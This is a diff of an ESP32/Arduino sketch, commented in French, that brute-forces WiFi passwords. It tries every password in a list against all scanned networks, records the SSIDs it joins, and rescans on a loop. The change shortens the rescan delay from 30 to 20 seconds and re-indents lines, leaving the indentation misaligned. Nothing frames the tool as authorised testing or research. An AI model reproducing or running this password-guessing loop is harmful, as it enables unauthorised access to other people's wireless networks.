@@ -75,7 +75,7 @@ void setup() {
 
 void loop() {
     scanAndConnect();
-    delay(30000); // Attendre 30 secondes avant de refaire un scan ⏳
+    delay(20000); // Attendre 20 secondes avant de refaire un scan ⏳
 }
 
 void scanAndConnect() {
@@ -119,7 +119,7 @@ void scanAndConnect() {
     }
 
     // Essayer chaque mot de passe sur tous les réseaux avant de passer au suivant
-    for (int j = 0; j < numPasswords; j++) {
+        for (int j = 0; j < numPasswords; j++) {
         Serial.printf("🔑 Trying password: %s on all networks\n", passwords[j]);
 
         for (int i = 0; i < targetCount; i++) {
@@ -130,34 +130,34 @@ void scanAndConnect() {
 
             while (millis() - startTime < 10000) { // Timeout de 10 sec
                 if (WiFi.status() == WL_CONNECTED) {
-                    Serial.printf("🎉 Connected successfully to %s!\n", targetSSIDs[i].c_str());
-                    Serial.printf("🌐 IP Address: %s\n", WiFi.localIP().toString().c_str());
+                Serial.printf("🎉 Connected successfully to %s!\n", targetSSIDs[i].c_str());
+                Serial.printf("🌐 IP Address: %s\n", WiFi.localIP().toString().c_str());
 
-                    // Ajouter ce réseau à la liste des connexions réussies
-                    if (successfulCount < 10) {
-                        successfulConnections[successfulCount++] = targetSSIDs[i];
-                    }
+                // Ajouter ce réseau à la liste des connexions réussies
+                if (successfulCount < 10) {
+                    successfulConnections[successfulCount++] = targetSSIDs[i];
+                }
 
-                    // Afficher la liste des connexions réussies
-                    Serial.println("✅ Successfully connected to the following networks:");
-                    for (int k = 0; k < successfulCount; k++) {
-                        Serial.printf("%d. %s\n", k + 1, successfulConnections[k].c_str());
-                    }
+                // Afficher la liste des connexions réussies
+                Serial.println("✅ Successfully connected to the following networks:");
+                for (int k = 0; k < successfulCount; k++) {
+                    Serial.printf("%d. %s\n", k + 1, successfulConnections[k].c_str());
+                }
 
                     // Retirer ce réseau de la liste des réseaux à essayer
                     for (int k = i; k < targetCount - 1; k++) {
                         targetSSIDs[k] = targetSSIDs[k + 1];
                     }
                     targetCount--;  // Réduire le nombre de réseaux à tester
-                    WiFi.disconnect();  // Se déconnecter du réseau courant
+                WiFi.disconnect();  // Se déconnecter du réseau courant
                     delay(4000); // Attendre avant de tester les autres
                     break;
                 }
                 delay(500);
             }
 
-            Serial.println("❌ Incorrect password! Trying next... 🔄");
-            WiFi.disconnect();
+                Serial.println("❌ Incorrect password! Trying next... 🔄");
+                WiFi.disconnect();
             delay(4000); // Délai de 4 secondes avant de tester le prochain réseau
         }
     }
